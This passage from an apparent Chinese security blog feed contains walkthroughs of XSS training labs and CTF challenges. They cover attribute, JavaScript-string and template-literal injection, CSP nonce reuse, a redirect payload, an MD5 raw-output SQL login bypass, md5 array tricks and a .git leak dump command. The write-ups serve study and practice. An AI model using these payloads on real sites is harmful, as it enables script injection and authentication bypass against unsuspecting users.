src="/XSS/XSS/image-20250731104732602.png" class="" title="image-20250731104732602"><p>animateTransform 是SVG中专门用于对元素进行变形动画的元素，它可以实现平移、旋转、缩放、斜切等变换效果。</p><h3 id="HTML标签属性中的XSS攻击"><a href="#HTML标签属性中的XSS攻击" class="headerlink" title="HTML标签属性中的XSS攻击"></a>HTML标签属性中的XSS攻击</h3><h4 id="反射型XSS——注入HTML标签属性（尖括号被HTML编码的情况）"><a href="#反射型XSS——注入HTML标签属性（尖括号被HTML编码的情况）" class="headerlink" title="反射型XSS——注入HTML标签属性（尖括号被HTML编码的情况）"></a>反射型XSS——注入HTML标签属性（尖括号被HTML编码的情况）</h4><h5 id="实验要求-5"><a href="#实验要求-5" class="headerlink" title="实验要求"></a>实验要求</h5><p>本实验在博客搜索功能中存在一个反射型跨站脚本（XSS）漏洞，但输入中的尖括号会被HTML编码。要完成本实验，请发起一次XSS攻击，通过注入属性并调用<code>alert</code>函数实现弹窗。</p><h5 id="实验过程-5"><a href="#实验过程-5" class="headerlink" title="实验过程"></a>实验过程</h5><p>实验要求告诉我们，搜索框存在XSS攻击，我们输入123，点击搜索。</p><p>按F12打开开发者工具，Ctrl+F，搜索123：</p><img src="/XSS/XSS/image-20250801074313257.png" class="" title="image-20250801074313257"><p>发现一个在h1标签里面，一个在input的value属性里面。</p><p>输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>:</p><img src="/XSS/XSS/image-20250801074420347.png" class="" title="image-20250801074420347"><p>完整的给我们输出出来，这说明有些地方肯定被实体化了。</p><img src="/XSS/XSS/image-20250801074607452.png" class="" title="image-20250801074607452"><p>尖括号被实体化了，那我们只能寄希望于input的value属性：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; autofocus onfocus=&quot;alert(1)</span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250801074806515.png" class="" title="image-20250801074806515"><p>autofocus属性用于自动获取焦点。</p><h4 id="存储型XSS——利用锚点href属性注入（双引号被HTML编码）"><a href="#存储型XSS——利用锚点href属性注入（双引号被HTML编码）" class="headerlink" title="存储型XSS——利用锚点href属性注入（双引号被HTML编码）"></a>存储型XSS——利用锚点href属性注入（双引号被HTML编码）</h4><h5 id="实验要求：-9"><a href="#实验要求：-9" class="headerlink" title="实验要求："></a>实验要求：</h5><p>该实验在评论功能中存在一个<strong>存储型跨站脚本（XSS）漏洞</strong>。要完成实验，你需要提交一条评论，<strong>当用户点击评论者姓名时触发<code>alert</code>函数</strong>。</p><h5 id="实验过程：-9"><a href="#实验过程：-9" class="headerlink" title="实验过程："></a>实验过程：</h5><p>实验要求告诉我们，在评论功能中，存在一个储存型跨站脚本漏洞。</p><p>进入博客的评论区，输入：</p><img src="/XSS/XSS/image-20250801084327721.png" class="" title="image-20250801084327721"><p>保存后，返回查看内容。</p><img src="/XSS/XSS/image-20250801084424834.png" class="" title="image-20250801084424834"><p>可以看到href属性我们可以控制，这里可以利用javascript的伪协议执行代码。</p><img src="/XSS/XSS/image-20250801084631959.png" class="" title="image-20250801084631959"><img src="/XSS/XSS/image-20250801084658212.png" class="" title="image-20250801084658212"><p>实验已经完成了。</p><h4 id="Canonical-链接标签中的反射型-XSS-漏洞"><a href="#Canonical-链接标签中的反射型-XSS-漏洞" class="headerlink" title="Canonical 链接标签中的反射型 XSS 漏洞"></a>Canonical 链接标签中的反射型 XSS 漏洞</h4><h5 id="实验要求：-10"><a href="#实验要求：-10" class="headerlink" title="实验要求："></a>实验要求：</h5><p>本实验将用户输入反射到 <strong>canonical 链接标签</strong> 中，并对尖括号进行了转义。</p><p>要完成该实验，您需要在主页上发起 <strong>跨站脚本（XSS）攻击</strong>，注入一个能触发 <code>alert</code> 函数的属性。</p><p>为辅助漏洞利用，您可以假设模拟用户会按下以下组合键：</p><ul><li><strong>Alt+Shift+X</strong></li><li><strong>Ctrl+Alt+X</strong></li><li><strong>Alt+X</strong></li></ul><p>请注意，该实验的预期解决方案 <strong>仅适用于 Chrome 浏览器</strong>。</p><h5 id="实验过程：-10"><a href="#实验过程：-10" class="headerlink" title="实验过程："></a>实验过程：</h5><p>进入实验，搜索canonical：</p><img src="/XSS/XSS/image-20250801092110797.png" class="" title="image-20250801092110797"><p>可以发现，href的值正是我们的网站网址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0ae900c504cbe9828341168000640008.web-security-academy.net/?&#x27;accesskey=&#x27;x&#x27;onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure><p>accesskey属性：用于设置快捷键，通过快捷键可以触发onclick事件。</p><p>我电脑上下载了两个浏览器，一个水狐，一个谷歌的，在谷歌上我不清楚为啥无法触发。在水狐上可以触发，按alt+shift+x，就可以触发。</p><h3 id="JavaScript上下文中的XSS攻击"><a href="#JavaScript上下文中的XSS攻击" class="headerlink" title="JavaScript上下文中的XSS攻击"></a>JavaScript上下文中的XSS攻击</h3><h4 id="单引号和反斜杠被转义情况下的反射型XSS攻击（嵌入JavaScript字符串上下文）"><a href="#单引号和反斜杠被转义情况下的反射型XSS攻击（嵌入JavaScript字符串上下文）" class="headerlink" title="单引号和反斜杠被转义情况下的反射型XSS攻击（嵌入JavaScript字符串上下文）"></a>单引号和反斜杠被转义情况下的反射型XSS攻击（嵌入JavaScript字符串上下文）</h4><h5 id="实验要求-6"><a href="#实验要求-6" class="headerlink" title="实验要求"></a>实验要求</h5><p>本实验在搜索查询跟踪功能中存在一个反射型跨站脚本(XSS)漏洞。用户输入被反射到一个JavaScript字符串中，且单引号(<code>&#39;</code>)和反斜杠(<code>\</code>)已被转义处理。</p><p>构造一个XSS攻击方案，突破JavaScript字符串的限制，成功执行<code>alert</code>函数。</p><h5 id="实验过程-6"><a href="#实验过程-6" class="headerlink" title="实验过程"></a>实验过程</h5><p>实验要求说，在搜索查询跟踪功能中存在XSS反射性漏洞。</p><p>输入 123 。</p><p>按f12打开开发者工具，进入源码搜索123。</p><img src="/XSS/XSS/image-20250801110647246.png" class="" title="image-20250801110647246"><p>总共有两个地方出现了123。</p><p>我们接着输入<code>123&lt;/script&gt;</code>。</p><img src="/XSS/XSS/image-20250801110921426.png" class="" title="image-20250801110921426"><p>上面进行将尖括号转换为了实体，下面并没有转换。</p><p>我们接着输入<code>123&#39;&lt;/script&gt;</code></p><img src="/XSS/XSS/image-20250801111047236.png" class="" title="image-20250801111047236"><p>发现其对单引号进行了转义，我们再加一个反斜杠，让它转义它自己；我们接着写入恶意代码。</p><p><code>123\&#39;&lt;/script&gt;&lt;img src=1 onerror=alert(1) /&gt;</code></p><img src="/XSS/XSS/image-20250801111431368.png" class="" title="image-20250801111431368"><p>实验完成。</p><h4 id="反射型XSS注入到JavaScript字符串中，且尖括号已HTML编码"><a href="#反射型XSS注入到JavaScript字符串中，且尖括号已HTML编码" class="headerlink" title="反射型XSS注入到JavaScript字符串中，且尖括号已HTML编码"></a>反射型XSS注入到JavaScript字符串中，且尖括号已HTML编码</h4><h5 id="实验要求-7"><a href="#实验要求-7" class="headerlink" title="实验要求"></a>实验要求</h5><p>该实验在搜索查询跟踪功能中存在一个反射型跨站脚本漏洞，其中尖括号已被编码。漏洞反射点位于JavaScript字符串内部。要完成本实验，需要构造一个跨站脚本攻击，突破JavaScript字符串的束缚并执行<code>alert</code>函数。</p><h5 id="实验过程-7"><a href="#实验过程-7" class="headerlink" title="实验过程"></a>实验过程</h5><p>在搜索功能输入123，打开开发者工具，进入源码查看内容。</p><img src="/XSS/XSS/image-20250803070557236.png" class="" title="image-20250803070557236"><p>可以看到，javascript的脚本是嵌套在html里面的，searchTerms用于获取我们搜索框输入的内容。在测试的过程中，发现并没有对单引号进行转义，可以直接输入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(1);//</span><br></pre></td></tr></table></figure><p>闭合单引号，;结束符，输入恶意代码，通过注释注释掉后面的多余字符。</p><img src="/XSS/XSS/image-20250803071828986.png" class="" title="image-20250803071828986"><p>后面还使用了document.write，encodeURIComponent对searchTerms进行了url编码。我们无法闭合双引号，并写入onerror事件。</p><p>实验完成。</p><h4 id="反射型XSS攻击：注入经过HTML编码（尖括号和双引号）且单引号被转义的JavaScript字符串环境"><a href="#反射型XSS攻击：注入经过HTML编码（尖括号和双引号）且单引号被转义的JavaScript字符串环境" class="headerlink" title="反射型XSS攻击：注入经过HTML编码（尖括号和双引号）且单引号被转义的JavaScript字符串环境"></a>反射型XSS攻击：注入经过HTML编码（尖括号和双引号）且单引号被转义的JavaScript字符串环境</h4><h5 id="实验要求-8"><a href="#实验要求-8" class="headerlink" title="实验要求"></a>实验要求</h5><p>该实验在搜索查询跟踪功能中存在一个反射型XSS漏洞，其中：</p><ul><li>尖括号（<code>&lt;</code> <code>&gt;</code>）和双引号（<code>&quot;</code>）已被HTML编码</li><li>单引号（<code>&#39;</code>）被转义</li></ul><p>要完成实验，请构造一个XSS攻击：</p><ol><li>突破JavaScript字符串限制</li><li>成功执行<code>alert</code>函数</li></ol><h5 id="实验过程-8"><a href="#实验过程-8" class="headerlink" title="实验过程"></a>实验过程</h5><p>输入123，打开开发者工具：</p><img src="/XSS/XSS/image-20250803083542794.png" class="" title="image-20250803083542794"><p>闭合但引号，写入恶意代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(1);//</span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250803083732532.png" class="" title="image-20250803083732532"><p>对单引号进行转义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#x27;;alert(1);//</span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250803084017742.png" class="" title="image-20250803084017742"><p>实验完成。</p><h4 id="反射型XSS：JavaScript-URL中部分字符被拦截的情况"><a href="#反射型XSS：JavaScript-URL中部分字符被拦截的情况" class="headerlink" title="反射型XSS：JavaScript URL中部分字符被拦截的情况"></a>反射型XSS：JavaScript URL中部分字符被拦截的情况</h4><h5 id="实验要求-9"><a href="#实验要求-9" class="headerlink" title="实验要求"></a>实验要求</h5><p>本实验会将您的输入反射到 JavaScript URL 中，但实际情况并非表面那么简单。虽然初看像是简单的挑战，但应用程序已拦截部分特殊字符以防止 XSS 攻击。</p><p>构造一个跨站脚本（XSS）攻击，成功执行 <code>alert</code> 函数，并确保弹窗消息中包含字符串 <code>1337</code>。</p><h5 id="实验过程-9"><a href="#实验过程-9" class="headerlink" title="实验过程"></a>实验过程</h5><p>页面没有搜索页面，进入博客文章。</p><p>打开开发者工具，搜索script。</p><img src="/XSS/XSS/image-20250803104313576.png" class="" title="image-20250803104313576"><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:fetch(&#x27;/analytics&#x27;, &#123;method:&#x27;post&#x27;,body:&#x27;/post%3fpostId%3d5&#x27;&#125;).finally(_ =&gt; window.location = &#x27;/&#x27;)&quot;</span>&gt;</span>Back to Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>body的值就是我们网站的部分网址，所以注入点在这里。</p><p>由于postId只能是数字，如果是其他内容会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/post?postId=5&amp;&#x27;&#125;/*JavaScript代码*/&#123;&#x27;</span><br></pre></td></tr></table></figure><p>使用&amp;间隔，postId传入的只有5，我们就可以使用<code>&#39;&#125;&#123;&#39;</code>闭合左右的花括号，并在其中间输入javaScript代码。</p><p>在JavaScript中，处理多个表达式，可以使用逗号分开，多个表达式都会运行，但只会返回最后一个表达式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/post?postId=5&amp;&#x27;&#125;,x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+&#x27;&#x27;,&#123;x:&#x27;</span><br></pre></td></tr></table></figure><p>在这里，我们可能犯一个错误，不知道toString的值到底是哪个，x 还是 window + ‘’ 还是 {x:’’}。</p><p>赋值运算分的优先级高于逗号运算符，逗号运算符一般配合圆括号使用。toString的值是x。</p><p>window+’’：空字符串与window进行拼接，会触发toString函数，toString函数被我们重写为x，所以触发的函数是x。</p><p>为啥要使用&#x2F;**&#x2F;，throw后面必紧跟表达式，如果我们在url中输入<code>throw onerror</code>，第一次url编码后，转变为<code>throw+onerror</code>，<code>throw+onerror</code>位于href内；了解一个原理：<code>&lt;a href=javascript: &gt;&lt;/a&gt;</code>，初始阶段(HTML解析)：HTML解析器会先对a标签的属性内容进行HTML实体编码进行解码，保留url解码部分；<code>javascript:</code>协议的执行阶段，提取href中的JavaScript代码，执行前进行URL解码，会自动解码JavaScript代码的所有url编码字符，在解码的过程中不会将+转换为空格，<code>throw+onerror=alert,1337</code>是错误的语法，使用<code>/**/</code>可以解决这个问题。</p><p>对象字面量必须是属性:值的形式，不然会报错。</p><p>throw&#x2F;**&#x2F;onerror&#x3D;alert,1337 重写了onerror函数，当前onerror函数是alert函数，逗号运算符将1337返回给throw，让其抛给onerror函数，执行<code>alert(1)</code>。</p><p>还有最重要的一点，即使你定义了一个只接收两个参数的函数，这个函数也可以接收额外的参数（额外的参数不会传到函数内部。），如果额外的参数是表达式，还会执行表达式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">num</span>(<span class="params">count</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="title function_">num</span>(count,count=<span class="number">1</span>); <span class="comment">// 0 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(count); <span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 说明count=1被执行了</span></span><br></pre></td></tr></table></figure><p>发送上面的payload,点击back to  blog 弹出1337，就成功完成实验。</p><h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><h4 id="存储型XSS攻击，注入到onclick事件中，其中尖括号（）和双引号（”）被HTML编码，单引号（’）和反斜杠（-）被转义"><a href="#存储型XSS攻击，注入到onclick事件中，其中尖括号（）和双引号（”）被HTML编码，单引号（’）和反斜杠（-）被转义" class="headerlink" title="存储型XSS攻击，注入到onclick事件中，其中尖括号（&lt;&gt;）和双引号（”）被HTML编码，单引号（’）和反斜杠（\）被转义"></a>存储型XSS攻击，注入到onclick事件中，其中尖括号（&lt;&gt;）和双引号（”）被HTML编码，单引号（’）和反斜杠（\）被转义</h4><h5 id="实验要求-10"><a href="#实验要求-10" class="headerlink" title="实验要求"></a>实验要求</h5><p>该实验在评论功能中存在一个<strong>存储型XSS漏洞</strong>。</p><p>提交一条评论，使得<strong>当用户点击评论作者的名字时</strong>，触发 <code>alert</code> 函数弹窗。</p><h5 id="实验过程-10"><a href="#实验过程-10" class="headerlink" title="实验过程"></a>实验过程</h5><p>实验要求告诉我们，是一个存储型XSS漏洞，我们进入一篇博客文章。</p><p>打开开发者工具搜索script，并没有搜索到任何相关内容。</p><p>我们进行评论，查看评论内容。</p><img src="/XSS/XSS/image-20250804085959952.png" class="" title="image-20250804085959952"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tracker=&#123;<span class="title function_">track</span>(<span class="params"></span>)&#123;&#125;&#125;;tracker.<span class="title function_">track</span>(<span class="string">&#x27;http://example.com&#x27;</span>);</span><br></pre></td></tr></table></figure><p>定义了一个tracker对象，tracker对象里面有一个track函数，track函数是一个空函数。</p><p>从这里我们可以看到注入点在评论功能的Website，如果我们将其闭合，并输入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;);alert(1);tracker.track(&#x27;</span></span><br></pre></td></tr></table></figure><p>后面的tracker.track主要是为了保持语法的正确性。</p><img src="/XSS/XSS/image-20250804090651023.png" class="" title="image-20250804090651023"><p>它对我们的单引号进行了转义。</p><p>浏览器在解析完标签和属性后，会在进一步处理标签属性之前，对标签属性的html实体进行解码，我们在浏览器中看到的是HTML实体解码后的内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com&amp;#39);alert(1);tracker.track(&amp;#39</span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250804094247364.png" class="" title="image-20250804094247364"><p>实验完成。</p><h3 id="JavaScript模板字符串中的XSS攻击"><a href="#JavaScript模板字符串中的XSS攻击" class="headerlink" title="JavaScript模板字符串中的XSS攻击"></a>JavaScript模板字符串中的XSS攻击</h3><h4 id="反射型XSS注入模板字符串（尖括号、单双引号、反斜杠和反引号均被Unicode转义）"><a href="#反射型XSS注入模板字符串（尖括号、单双引号、反斜杠和反引号均被Unicode转义）" class="headerlink" title="反射型XSS注入模板字符串（尖括号、单双引号、反斜杠和反引号均被Unicode转义）"></a>反射型XSS注入模板字符串（尖括号、单双引号、反斜杠和反引号均被Unicode转义）</h4><h5 id="实验要求-11"><a href="#实验要求-11" class="headerlink" title="实验要求"></a>实验要求</h5><p>该实验在博客搜索功能中存在一个反射型跨站脚本(XSS)漏洞。漏洞反射点位于模板字符串内部，且已对尖括号、单双引号进行了HTML编码，反引号也做了转义处理。要完成本实验，请构造一个能在该模板字符串中执行alert函数的XSS攻击。</p><h5 id="实验过程-11"><a href="#实验过程-11" class="headerlink" title="实验过程"></a>实验过程</h5><p>在搜索页面输入123，打开开发者工具，搜索123：</p><img src="/XSS/XSS/image-20250804104719173.png" class="" title="image-20250804104719173"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> message = <span class="string">`0 search results for &#x27;123&#x27;`</span>; <span class="comment">// 使用了反引号</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;searchMessage&#x27;</span>).<span class="property">innerText</span> = message;</span><br></pre></td></tr></table></figure><p>反引号允许变量或表达式，通过${}嵌入到反引号内，123的输入点我们可控，我们可以输入<code>$&#123;alert(1)&#125;</code>，就可以执行alert函数。</p><img src="/XSS/XSS/image-20250804105127774.png" class="" title="image-20250804105127774"><p>到这里实验就结束了。</p><h2 id="AFCTF-2021-BABY-CSP"><a href="#AFCTF-2021-BABY-CSP" class="headerlink" title="[AFCTF 2021]BABY_CSP"></a>[AFCTF 2021]BABY_CSP</h2><img src="/XSS/XSS/image-20250724073356812.png" class="" title="image-20250724073356812"><p>源码里面本来没有任何内容，当我们点击标签时，页面源码会添加一些内容：</p><img src="/XSS/XSS/image-20250724073528487.png" class="" title="image-20250724073528487"><p>感觉可以写入恶意代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?school=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>报错了：</p><img src="/XSS/XSS/image-20250724073818519.png" class="" title="image-20250724073818519"><p>拒绝执行我们插入的XSS代码，缺少nonce属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?school=&lt;script nonce=&quot;29de6fde0db5686d&quot;&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>就可以执行了。</p><p>我有点懵逼的是，将alert(1)替换为alert(flag)，就可以得到flag。</p><blockquote><p>考察的知识点：CSP内容安全策略</p></blockquote><h2 id="NSSRound-18-Basic-门酱想玩什么呢？"><a href="#NSSRound-18-Basic-门酱想玩什么呢？" class="headerlink" title="[NSSRound#18 Basic]门酱想玩什么呢？"></a>[NSSRound#18 Basic]门酱想玩什么呢？</h2><p>启动页面有隐藏的提示：</p><img src="/XSS/XSS/image-20250724085458920.png" class="" title="image-20250724085458920"><p>有一个PHP文件：nssctfroundSpring.php</p><p>访问后有一部分源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//部分关键代码</span></span><br><span class="line"><span class="variable">$contentLines</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$comment</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>], <span class="variable">$matches</span>) &amp;&amp; <span class="title function_ invoke__">end</span>(<span class="variable">$contentLines</span>) === <span class="string">&#x27;/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$urlParts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$urlParts</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27;</span> . <span class="variable">$matches</span>[<span class="number">0</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//.......</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挑一些不易懂的说说：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>; <span class="comment">// ^https? 开头https匹配0次或1次，://匹配，\S+匹配任意非空白字符</span></span><br><span class="line"><span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>; <span class="comment">// [^\/] 匹配除/以外的任意字符，必须以.png后缀结尾。</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://&quot;onerror=&quot;alert(1)&quot;/1.png /png</span><br></pre></td></tr></table></figure><p>可以绕过。</p><p>进入评论区，内容输入payload，标题为123，弹窗，说明可以进行XSS攻击。</p><img src="/XSS/XSS/image-20250724111520821.png" class="" title="image-20250724111520821"><p>门酱说它想玩元梦之星。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://&quot;onerror=&quot;document.location=&#x27;https://ymzx.qq.com/&#x27;&quot;/1.png /png</span><br></pre></td></tr></table></figure><p>内容输入上面内容，发现可以跳转。<br>我们将<br><code>http://node4.anna.nssctf.cn:28698/words/?title=MTIz&amp;content=aHR0cHMlM0ElMkYlMkYlMjJvbmVycm9yJTNEJTIyZG9jdW1lbnQubG9jYXRpb24lM0QnaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyRiclMjIlMkYxLnBuZyUyMCUyRnBuZw%3D%3D</code>链接放入：</p><img src="/XSS/XSS/image-20250724112537643.png" class="" title="image-20250724112537643"><p>点击给门酱看就可以出现flag。</p><blockquote><p>我是真吐了，一到元梦之星页面就蓝屏。这道题也有问题了，环境没有配置好。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF 2020</title>
      <link href="/CTFwp/BJDCTF-2020/"/>
      <url>/CTFwp/BJDCTF-2020/</url>
      
        <content type="html"><![CDATA[<h2 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h2><p>打开源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">action</span>=<span class="string">&quot;leveldo4.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&#x27;password&#x27;</span> <span class="attr">class</span>=<span class="string">&quot;in&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;give&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现了一个表单。将password的内容发送给leveldo4.php。剩下的源码并没有啥可用的信息。由于buuctf限流了，我们就不进行目录爆破了。</p><p>紧接着我们进行抓包，发包。</p><img src="/CTFwp/BJDCTF-2020/image-1.png" class=""><p>在响应包发现这个东西。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> password<span class="operator">=</span>md5($pass,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>大胆猜测，上面表单的内容可能发给$pass了，md5第二个参数如果为true，其返回内容将以16字符长度的二进制原始数据。</p><p>我们输入ffifdyop试试。其md5加密返回的内容是万能密码。</p><p>跳转到levels91.php，先查看源码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET[&#x27;a&#x27;];</span></span><br><span class="line"><span class="comment">$b = $_GET[&#x27;b&#x27;];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>这简单，没有强制类型转化，用数组绕过就可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><p>跳转到levell14.php。出现php源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>没有强制类型转换，数组绕过即可。</p><h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><p>此题是一个blog，我分析网页源码，并没有发现有用的信息，抓包也没有发现有用的信息，由于buu限流，我并没有进行目录爆破，然后就卡住了。看了别人的博客后，知道此题是一个.git泄漏，下载了一个工具，然后进行.git泄漏。</p><p>我现在来整理一下我的思路：</p><p>在网页最下面我发现的有用信息是dog。</p><p>抓包收集到的信息是php7.3。</p><p>由于buu限流，并没有目录爆破，去看别人的博客发现是.git信息泄漏。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dumpall.py -u http://2d0fc723-77a3-4a1f-af5f-6c6fedcad73a.node5.buuoj.cn:81/.git/</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span 